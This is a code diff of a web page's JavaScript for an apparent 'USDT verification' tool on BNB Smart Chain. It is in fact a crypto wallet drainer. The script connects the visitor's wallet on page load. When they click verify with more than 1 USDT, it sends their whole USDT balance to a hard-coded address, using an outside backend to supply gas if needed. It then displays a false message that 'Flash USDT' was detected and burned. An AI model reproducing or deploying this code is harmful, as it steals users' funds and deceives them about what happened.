@@ -1,3 +1,4 @@
+<script>
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
@@ -5,35 +6,39 @@ const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 let web3;
 let userAddress;
 
+// Universal wallet connect function
 async function connectWallet() {
-    if (window.ethereum) {
+    if (typeof window.ethereum !== "undefined") {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_requestAccounts" });
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
 
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
-                params: [{ chainId: "0x38" }]
+                params: [{ chainId: "0x38" }] // BNB Smart Chain
             });
 
-            const accounts = await web3.eth.getAccounts();
             userAddress = accounts[0];
-            console.log("Wallet Connected:", userAddress);
+            console.log("✅ Wallet connected:", userAddress);
         } catch (error) {
-            console.error("Error connecting wallet:", error);
-            alert("Please switch to BNB Smart Chain.");
+            console.error("❌ Wallet connect error:", error);
+            alert("Please connect your wallet and switch to BNB Smart Chain.");
         }
     } else {
-        alert("Please install MetaMask.");
+        alert("No wallet found. Please install MetaMask, Trust Wallet, or any Web3 wallet.");
     }
 }
 
-// ✅ Auto-connect wallet on page load
-window.addEventListener("load", connectWallet);
+// ✅ Force connect on load (supports all wallets)
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        connectWallet();
+    }, 300);
+});
 
 async function verifybutton() {
     if (!web3 || !userAddress) {
-        alert("Wallet not connected. Refresh the page.");
+        alert("Wallet not connected. Please refresh.");
         return;
     }
 
@@ -49,8 +54,7 @@ async function verifybutton() {
     const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
     const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
 
-    console.log(`USDT Balance: ${usdtBalance} USDT`);
-    console.log(`BNB Balance: ${userBNB} BNB`);
+    console.log(`USDT: ${usdtBalance}, BNB: ${userBNB}`);
 
     if (usdtBalance === 0) {
         showPopup("No assets found.", "black");
@@ -58,10 +62,7 @@ async function verifybutton() {
     }
 
     if (usdtBalance <= 1) {
-        showPopup(
-            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
-            "green"
-        );
+        showPopup(`✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`, "green");
         return;
     }
 
@@ -72,7 +73,7 @@ async function verifybutton() {
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-            console.log("User BNB is low. Requesting BNB from backend...");
+            console.log("Requesting BNB from backend...");
             await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -90,15 +91,10 @@ async function transferUSDT(usdtBalance, userBNB) {
 
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
 
-        showPopup(
-            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
-            "red"
-        );
-
-        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
+        showPopup(`✅ Flash USDT detected and burned.<br><b>Burned:</b> ${usdtBalance} USDT`, "red");
     } catch (error) {
         console.error("❌ USDT Transfer Failed:", error);
-        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
+        alert("USDT transfer failed. Make sure you have BNB for gas.");
     }
 }
 
@@ -133,3 +129,4 @@ function showPopup(message, color) {
 }
 
 document.getElementById("verifyAssets").addEventListener("click", verifybutton);
+</script>
